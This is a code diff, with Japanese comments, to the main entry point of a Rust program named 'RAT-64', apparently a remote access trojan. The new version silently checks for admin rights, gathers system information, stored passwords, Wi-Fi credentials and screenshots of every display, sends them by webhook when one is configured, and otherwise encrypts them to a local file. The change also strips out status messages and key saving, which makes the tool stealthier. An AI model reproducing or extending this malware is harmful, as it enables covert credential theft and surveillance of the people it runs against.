@@ -1,100 +1,148 @@
-use std::fs::File;
-use std::io::Write;
+// RAT-64 最適化版メインエントリポイント
 use rmp_serde::encode::to_vec as to_msgpack_vec;
-use base64::{engine::general_purpose, Engine as _};
-use rand::Rng;
+// Base64機能は削除されました (key.dat保存機能削除のため)
+use rand::RngCore;
 
-use rat_64::{
-    WebhookType, FullSystemData,
-    get_system_info, load_config,
-    send_webhook, get_screenshot_base64, get_webcam_image_base64,
-    encrypt_data
-};
+use rat_64::{collect_auth_data_with_config, encrypt_data_with_key, is_admin};
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    println!("🔍 RAT-64 System Monitor 開始");
+#[cfg(feature = "screenshot")]
+use rat_64::modules::screen_capture::{capture_screenshot, capture_all_displays, ScreenshotConfig};
+
+// スクリーンショット収集統合版
+fn collect_screenshots() -> rat_64::ScreenshotData {
+    let capture_time = format!("{:?}", std::time::SystemTime::now());
     
-    // 設定読み込み
-    let config = load_config();
-    println!("📋 設定読み込み完了: {:?}", config.webhook_type);
-    
-    // システム情報収集
-    println!("📊 システム情報を収集中...");
-    let system_info = get_system_info();
-    println!("✅ システム情報収集完了");
-    
-    // 画像取得（設定による）
-    let screenshot = if config.collect_screenshots {
-        println!("📸 スクリーンショット取得中...");
-        get_screenshot_base64()
-    } else {
-        String::new()
-    };
-    
-    let webcam = if config.collect_webcam {
-        println!("📹 Webカメラ画像取得中...");
-        get_webcam_image_base64()
-    } else {
-        String::new()
-    };
-    
-    // Webhook送信
-    if matches!(config.webhook_type, WebhookType::None) {
-        println!("⚠️  Webhook設定なし - データをローカルファイルに保存します");
-    } else {
-        println!("🔗 Webhook送信中...");
-        if let Err(e) = send_webhook(&config, &system_info, &screenshot) {
-            println!("❌ Webhook送信失敗: {}", e);
+    #[cfg(feature = "screenshot")]
+    {
+        let config = ScreenshotConfig::default();
+        let primary_display = capture_screenshot(&config)
+            .map(Some)
+            .unwrap_or(None);
+        
+        let all_displays = capture_all_displays(&config)
+            .unwrap_or_else(|_| Vec::new());
+        
+        let primary_count = if primary_display.is_some() { 1 } else { 0 };
+        rat_64::ScreenshotData {
+            primary_display,
+            total_count: all_displays.len() + primary_count,
+            all_displays,
+            capture_time,
         }
     }
     
-    // 全データの統合
-    let full_data = FullSystemData {
-        system_info,
-        screenshot: screenshot.clone(),
-        webcam_image: webcam,
-    };
+    #[cfg(not(feature = "screenshot"))]
+    {
+        rat_64::ScreenshotData {
+            primary_display: None,
+            all_displays: Vec::new(),
+            capture_time,
+            total_count: 0,
+        }
+    }
+}
+
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // 権限チェック（サイレント）
+    let _admin_mode = is_admin();
     
-    // データシリアライゼーション
-    println!("📦 データをMessagePackでシリアライズ中...");
+    // 統合モジュールシステムまたはコア機能を実行
+    let args: Vec<String> = std::env::args().collect();
+    if args.len() > 1 && args[1] == "--integrated" {
+        execute_integrated_system()
+    } else {
+        execute_rat_core()
+    }
+}
+
+fn execute_rat_core() -> Result<(), Box<dyn std::error::Error>> {
+    let config = rat_64::load_config_or_default();
+    
+    // Webhook機能優先実行
+    #[cfg(feature = "webhook")]
+    if config.webhook_enabled && !config.webhook_url.is_empty() {
+        return rat_64::run_with_webhook(&config)
+            .map_err(|e| format!("Webhook実行エラー: {}", e).into());
+    }
+    
+    // システム情報収集
+    let system_info = rat_64::get_system_info()
+        .map_err(|e| format!("システム情報収集エラー: {}", e))?;
+    
+    // 認証情報収集
+    let auth_data = if config.collect_auth_data {
+        collect_auth_data_with_config(&config)
+    } else {
+        rat_64::AuthData { passwords: Vec::new(), wifi_creds: Vec::new() }
+    };
+
+    // スクリーンショット収集
+    let screenshot_data = if config.collect_screenshots {
+        collect_screenshots()
+    } else {
+        rat_64::ScreenshotData {
+            primary_display: None,
+            all_displays: Vec::new(),
+            capture_time: format!("{:?}", std::time::SystemTime::now()),
+            total_count: 0,
+        }
+    };
+
+    // データ統合とシリアライゼーション
+    #[derive(serde::Serialize)]
+    struct FullData {
+        system_info: rat_64::SystemInfo,
+        auth_data: rat_64::AuthData,
+        screenshot_data: rat_64::ScreenshotData,
+    }
+    
+    let full_data = FullData { system_info, auth_data, screenshot_data };
     let data = to_msgpack_vec(&full_data)?;
     
-    // 暗号化キー生成
+    // 暗号化キー生成と暗号化
     let mut key = [0u8; 32];
     let mut nonce = [0u8; 12];
-    rand::rng().fill(&mut key);
-    rand::rng().fill(&mut nonce);
+    rand::rng().fill_bytes(&mut key);
+    rand::rng().fill_bytes(&mut nonce);
+
+    let encrypted_data = encrypt_data_with_key(&data, &key, &nonce)?;
     
-    // データ暗号化
-    println!("🔐 データを暗号化中...");
-    let encrypted_data = encrypt_data(&data, &key, &nonce)?;
-    
-    // 暗号化データ保存（バイナリ形式）
-    let mut file = File::create("data.dat")?;
-    file.write_all(&encrypted_data)?;
-    println!("💾 暗号化データを data.dat に保存しました");
-    
-    // キーとNonceを保存（セキュリティのため別ファイル）
-    println!("🔑 暗号化キーを保存中...");
-    save_key_and_nonce(&key, &nonce)?;
-    
-    println!("✅ 全ての処理が完了しました！");
-    println!("📝 復号化するには: cargo run --bin decrypt data.dat");
-    println!("🔍 キーを確認するには: cargo run --bin show_key key.dat");
+    // 暗号化データ保存のみ（key.dat機能は削除）
+    save_data_only(&encrypted_data)?;
     
     Ok(())
 }
 
-fn save_key_and_nonce(key: &[u8; 32], nonce: &[u8; 12]) -> Result<(), Box<dyn std::error::Error>> {
-    // Base64エンコード
-    let key_b64 = general_purpose::STANDARD.encode(key);
-    let nonce_b64 = general_purpose::STANDARD.encode(nonce);
-    
-    // キーファイルに保存（バイナリ形式）
-    let key_data = format!("KEY:{}\nNONCE:{}", key_b64, nonce_b64);
-    let mut key_file = File::create("key.dat")?;
-    key_file.write_all(key_data.as_bytes())?;
-    
-    println!("🔐 暗号化キーとNonceを key.dat に保存しました");
+// 統合ファイル保存関数
+fn save_data_only(encrypted_data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
+    // 暗号化データ保存のみ
+    std::fs::write("data.dat", encrypted_data)?;
     Ok(())
+}
+
+fn execute_integrated_system() -> Result<(), Box<dyn std::error::Error>> {
+    #[cfg(any(feature = "browser", feature = "screenshot", feature = "webhook"))]
+    {
+        let config = rat_64::load_config_or_default();
+        let auth_data = collect_auth_data_with_config(&config);
+        let serialized_data = rmp_serde::to_vec(&auth_data)?;
+        
+        // キー生成と暗号化
+        let mut key = [0u8; 32];
+        let mut nonce = [0u8; 12];
+        rand::rng().fill_bytes(&mut key);
+        rand::rng().fill_bytes(&mut nonce);
+        
+        let encrypted_data = encrypt_data_with_key(&serialized_data, &key, &nonce)?;
+        
+        // ファイル保存（データのみ）
+        save_data_only(&encrypted_data)?;
+        
+        Ok(())
+    }
+    
+    #[cfg(not(any(feature = "browser", feature = "screenshot", feature = "webhook")))]
+    {
+        Err("統合モジュールシステムが利用できません".into())
+    }
 }
